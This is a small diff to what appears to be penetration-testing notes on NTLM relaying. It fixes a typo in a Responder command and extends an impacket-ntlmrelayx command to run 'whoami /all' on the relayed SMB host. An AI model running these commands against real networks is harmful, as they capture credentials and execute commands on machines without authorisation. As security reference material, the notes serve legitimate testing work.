@@ -90,11 +90,11 @@ LDAP = Off
 
 Start responder: 
 
-    responder -I eth0 -f -v`
+    responder -I eth0 -f -v
 
 Start ntlmrelayx:
 
-    impacket-ntlmrelayx -t smb://<ip-to-relay-to> --enum-local-admins -smb2support
+    impacket-ntlmrelayx -t smb://<ip-to-relay-to> --enum-local-admins -smb2support -c 'whoami /all' -debug
 
 Reference:
 
